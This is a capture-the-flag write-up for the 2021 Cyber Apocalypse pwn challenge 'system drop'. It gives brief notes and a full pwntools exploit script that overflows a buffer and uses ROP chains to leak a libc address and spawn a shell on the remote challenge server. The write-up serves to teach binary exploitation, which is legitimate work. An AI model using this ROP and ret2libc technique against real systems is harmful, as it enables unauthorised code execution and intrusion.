---
title: system drop
date: 2021-04-23
categories: [pwn]
tags: [cyberapocalpyse2021]
toc: false
---


#### Notes:
- Binary only comes with NX enabled as mitigation
- read(0, buffer, 0x100) for buffer overflow, except we are limited on gadgets
- We can use `mov eax, 0x1` in main as part of our ROP chain, this was originally intended for the program to return a status code of 1
- Originally this challenge gave me srop vibes. I tried a few srop payloads and used alarm() to set eax to 0xf to trigger the sig return syscall. For some reason my registers wern't set as I wanted it. But after seeing the `mov eax, 0x1` instruction, I realized you can just leak an address using the write() syscall and do a standard system('/bin/sh\x00') rop chain

#### Plan:
- Leak alarm libc address and calculate libc base using write(1, alarm_GOT, 0x100)
- Return back to _start and send second payload with calculated system and '/bin/sh' 

#### main:

![Snippet of main()](/assets/img/cyberapoc/systemdrop/main.png)

#### PoC:

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template system_drop
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('system_drop')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+46
b *0x40053b
b *0x400537
b *0x400430
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

#io = start()
io = remote('138.68.141.182', 32321)

pop_rdi_ret = 0x4005d3
pop_rsi_pop_r15_ret = 0x4005d1
ret = 0x400416
_start = 0x400450
syscall = 0x40053b
alarm_got = 0x601018

payload = flat({
    40: p64(pop_rdi_ret),
    48: p64(0x1),
    56: p64(pop_rsi_pop_r15_ret),
    64: p64(alarm_got),
    72: p64(0x0),
    80: p64(syscall),
    88: p64(ret),
    96: p64(_start)
})

io.sendline(payload)

leak = int.from_bytes(io.recv(30)[0:8], 'little')
print('Leak: ', hex(leak))

libc_base = leak - 0x0e4610
print('Libc base: ', hex(libc_base))

system = libc_base + 0x04f550
str_bin_sh = libc_base + 0x1b3e1a
payload2 = flat({
    40: p64(pop_rdi_ret),
    48: p64(str_bin_sh),
    56: p64(ret),
    64: p64(system)
})

io.sendline(payload2)

io.interactive()

# CHTB{n0_0utput_n0_pr0bl3m_w1th_sr0p}
```